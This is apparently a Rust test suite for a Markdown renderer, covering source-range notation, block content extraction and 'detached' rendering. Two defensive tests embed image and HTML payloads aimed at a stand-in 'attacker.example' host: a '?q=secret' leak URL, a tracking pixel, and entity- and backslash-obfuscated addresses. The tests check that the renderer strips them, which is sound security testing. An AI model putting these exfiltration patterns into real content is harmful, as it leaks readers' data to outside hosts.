//! Reading the source behind what the page shows — a block's content by the
//! range the rendered HTML names — and rendering what was not read from the
//! file.

use arto_markdown::{
    block_content, render_detached, render_to_html, source_text, BlockKind, ImageResolution,
    RawHtml, RenderOptions, SourcePosition, SourceRange,
};
use indoc::indoc;
use std::path::Path;

const BASE: &str = "/nonexistent/test.md";

fn render(markdown: &str) -> String {
    render_to_html(markdown, Path::new(BASE), &RenderOptions::default())
        .expect("renders")
        .html
}

/// The `data-source-range` of every `<tag …>` start tag in `html`, in order.
fn ranges(html: &str, tag: &str) -> Vec<SourceRange> {
    html.match_indices(&format!("<{tag} "))
        .filter_map(|(pos, _)| {
            let end = html[pos..].find('>').map_or(html.len(), |end| pos + end);
            let value = html[pos..end].split(r#" data-source-range=""#).nth(1)?;
            value[..value.find('"')?].parse().ok()
        })
        .collect()
}

/// The content of each `<tag>` block of `markdown`, read back by its range.
fn contents(markdown: &str, tag: &str, kind: BlockKind) -> Vec<Option<String>> {
    let html = render(markdown);
    ranges(&html, tag)
        .iter()
        .map(|range| block_content(markdown, kind, range, None, &RenderOptions::default()))
        .collect()
}

fn some(values: &[&str]) -> Vec<Option<String>> {
    values.iter().map(|value| Some(value.to_string())).collect()
}

// ----------------------------------------------------------------------
// Source ranges
// ----------------------------------------------------------------------

#[test]
fn a_range_reads_and_writes_the_attribute_notation() {
    let range: SourceRange = "12:3-14:20".parse().expect("parses");
    assert_eq!(
        range.start,
        SourcePosition {
            line: 12,
            column: 3
        }
    );
    assert_eq!(
        range.end,
        SourcePosition {
            line: 14,
            column: 20
        }
    );
    assert_eq!(range.to_string(), "12:3-14:20");
}

#[test]
fn ranges_and_positions_travel_as_their_notation() {
    let range: SourceRange = serde_json::from_str(r#""3:1-4:15""#).expect("parses");
    assert_eq!(serde_json::to_string(&range).unwrap(), r#""3:1-4:15""#);

    let position: SourcePosition = serde_json::from_str(r#""7:2""#).expect("parses");
    assert_eq!(position, SourcePosition { line: 7, column: 2 });
    assert!(serde_json::from_str::<SourcePosition>(r#""7""#).is_err());

    let kind: BlockKind = serde_json::from_str(r#""table-cell""#).expect("parses");
    assert_eq!(kind, BlockKind::TableCell);
}

#[test]
fn a_range_that_names_no_character_is_rejected() {
    for value in [
        "", "12", "0:1-1:1", "1:0-1:1", "2:1-1:1", "1:5-1:4", "a:1-1:1",
    ] {
        assert!(value.parse::<SourceRange>().is_err(), "{value:?}");
    }
}

// ----------------------------------------------------------------------
// Block content
// ----------------------------------------------------------------------

#[test]
fn a_paragraph_is_its_own_text() {
    let markdown = "First line\nsecond line.\n\nAnother one.\n";

    assert_eq!(
        contents(markdown, "p", BlockKind::Paragraph),
        some(&["First line\nsecond line.", "Another one."])
    );
}

#[test]
fn a_quoted_paragraph_loses_the_markers_of_its_later_lines() {
    let markdown = "> one\n> two\ncontinued lazily\n>\n> > nested\n> > deeper\n";

    assert_eq!(
        contents(markdown, "p", BlockKind::Paragraph),
        some(&["one\ntwo\ncontinued lazily", "nested\ndeeper"])
    );
}

#[test]
fn an_alert_body_is_its_text() {
    let markdown = "> [!NOTE]\n> The body\n> goes on.\n";

    assert_eq!(
        contents(markdown, "p", BlockKind::Paragraph),
        some(&["The body\ngoes on."])
    );
}

#[test]
fn a_heading_loses_its_markers() {
    let markdown = indoc! {"
        # Title

        ## Closed ##

        Setext
        ======

        ### Named {#named .x}

        # What {this means}
    "};

    assert_eq!(
        contents(markdown, "h1", BlockKind::Heading),
        some(&["Title", "Setext", "What {this means}"])
    );
    assert_eq!(
        contents(markdown, "h2", BlockKind::Heading),
        some(&["Closed"])
    );
    assert_eq!(
        contents(markdown, "h3", BlockKind::Heading),
        some(&["Named"])
    );
}

#[test]
fn a_setext_heading_in_a_quote_loses_its_underline() {
    assert_eq!(
        contents("> Title\n> =====\n", "h1", BlockKind::Heading),
        some(&["Title"])
    );
}

#[test]
fn heading_braces_stay_when_the_parser_does_not_read_attributes() {
    let options = RenderOptions {
        heading_attributes: false,
        ..RenderOptions::default()
    };
    let markdown = "# Named {#named}\n";
    let range = "1:1-1:16".parse().expect("parses");

    assert_eq!(
        block_content(markdown, BlockKind::Heading, &range, None, &options).as_deref(),
        Some("Named {#named}")
    );
}

#[test]
fn a_list_item_loses_its_marker_and_its_checkbox() {
    let markdown = "- one\n* two\n  wrapped\n3. three\n4) four\n- [ ] todo\n- [x] done\n";

    assert_eq!(
        contents(markdown, "li", BlockKind::ListItem),
        some(&["one", "two\nwrapped", "three", "four", "todo", "done"])
    );
}

#[test]
fn a_list_item_stops_where_its_nested_block_starts() {
    let markdown = "- parent\n  text\n  - child\n";
    let html = render(markdown);
    let items = ranges(&html, "li");
    let nested = ranges(&html, "ul")[1];

    assert_eq!(
        block_content(
            markdown,
            BlockKind::ListItem,
            &items[0],
            Some(nested.start),
            &RenderOptions::default()
        )
        .as_deref(),
        Some("parent\ntext")
    );
}

#[test]
fn a_table_cell_is_its_text() {
    let markdown = "| Name | 値 |\n| --- | --- |\n| `a \\| b` | 日本語 |\n";

    assert_eq!(
        contents(markdown, "th", BlockKind::TableCell),
        some(&["Name", "値"])
    );
    assert_eq!(
        contents(markdown, "td", BlockKind::TableCell),
        some(&["`a \\| b`", "日本語"])
    );
}

#[test]
fn definitions_are_their_text() {
    let markdown = "Term\n: The definition\n";

    assert_eq!(
        contents(markdown, "dt", BlockKind::DefinitionTerm),
        some(&["Term"])
    );
    assert_eq!(
        contents(markdown, "dd", BlockKind::Definition),
        some(&["The definition"])
    );
}

#[test]
fn ranges_count_through_the_frontmatter_and_line_endings() {
    let markdown = "---\ntitle: T\n---\n\n日本語の段落。\r\n続き。\r\n";

    assert_eq!(
        contents(markdown, "p", BlockKind::Paragraph),
        some(&["日本語の段落。\n続き。"])
    );
}

#[test]
fn a_range_outside_the_document_has_no_content() {
    let range = "9:1-9:3".parse().expect("parses");

    assert_eq!(
        block_content(
            "one line\n",
            BlockKind::Paragraph,
            &range,
            None,
            &RenderOptions::default()
        ),
        None
    );
}

// ----------------------------------------------------------------------
// Rendering what did not come from the file
// ----------------------------------------------------------------------

#[test]
fn a_detached_document_renders_like_one_without_ranges() {
    let html = render_detached(
        "---\ntitle: 翻訳\n---\n\n# 見出し\n\n- 一つ\n- [リンク](other.md)\n",
        Path::new(BASE),
        &RenderOptions::default(),
    )
    .expect("renders")
    .html;

    assert!(html.contains(r#"<details class="frontmatter""#), "{html}");
    assert!(html.contains("<h1>見出し</h1>"), "{html}");
    assert!(html.contains("<li>一つ</li>"), "{html}");
    assert!(html.contains(r#"data-md-link="other.md""#), "{html}");
    assert!(!html.contains("data-source-range"), "{html}");
}

#[test]
fn a_detached_document_fetches_nothing_from_elsewhere() {
    let options = RenderOptions {
        images: ImageResolution::Deferred {
            base_url: "arto://local/img".to_string(),
        },
        raw_html: RawHtml::Allow,
        ..RenderOptions::default()
    };
    let html = render_detached(
        indoc! {r#"
            ![leak](https://attacker.example/?q=secret)

            ![tracker](//attacker.example/pixel.png)

            ![entity](https&#58;//attacker.example/entity)

            <video poster="https://attacker.example/p.png"></video>

            ![kept](data:image/png;base64,AAAA)

            [a link is only followed when clicked](https://example.com)
        "#},
        Path::new(BASE),
        &options,
    )
    .expect("renders")
    .html;

    assert!(!html.contains("attacker.example"), "{html}");
    assert!(html.contains("leak"), "the alt text stays: {html}");
    assert!(html.contains("data:image/png;base64,AAAA"), "{html}");
    assert!(html.contains(r#"href="https://example.com""#), "{html}");
}

#[test]
fn a_detached_document_fetches_nothing_from_an_address_written_with_backslashes() {
    // A page served over http reads `\` as `/` in an address, so these are
    // protocol-relative: `http://attacker.example/…` on that page.
    let options = RenderOptions {
        images: ImageResolution::Deferred {
            base_url: "http://arto.localhost/img".to_string(),
        },
        ..RenderOptions::default()
    };
    let html = render_detached(
        indoc! {r#"
            ![backslashes](\\\\attacker.example/a.png)

            ![mixed](/\attacker.example/b.png)
        "#},
        Path::new(BASE),
        &options,
    )
    .expect("renders")
    .html;

    assert!(!html.contains("attacker.example"), "{html}");
    assert!(html.contains("backslashes"), "the alt text stays: {html}");
}

// ----------------------------------------------------------------------
// Source text
// ----------------------------------------------------------------------

#[test]
fn source_text_is_the_range_as_written() {
    let markdown = "> # Title\n>\n> - one\r\n> - two\n";
    let range = "3:3-4:7".parse().expect("parses");

    assert_eq!(
        source_text(markdown, &range).as_deref(),
        Some("- one\r\n> - two")
    );
    assert_eq!(
        source_text(markdown, &"9:1-9:1".parse().expect("parses")),
        None
    );
}
